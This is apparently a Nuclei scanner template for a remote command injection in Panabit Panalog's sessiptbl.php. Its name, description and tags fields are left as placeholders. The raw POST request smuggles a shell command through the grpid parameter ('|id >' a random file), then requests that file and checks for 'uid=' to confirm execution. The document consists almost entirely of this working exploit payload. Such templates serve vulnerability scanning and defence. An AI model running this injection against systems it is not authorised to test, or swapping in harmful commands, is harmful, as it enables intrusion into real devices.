id: Panabit-Panalog-sessiptbl-rce
info:
  name: Template Name
  author: wangzong
  severity: info
  description: description
  reference:
    - https://github.com/MrWQ/vulnerability-paper/blob/49d58e074da5d98653549f2c2b02a9c4c92021fc/bugs/Panalog%20%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E8%AE%BE%E5%A4%87%E5%AE%A1%E8%AE%A1.md
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /sessiptbl.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Length: 23

        action=serverdelay&grpid=|id >{{filename}}.txt
      - |+
        GET /{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - 'uid='
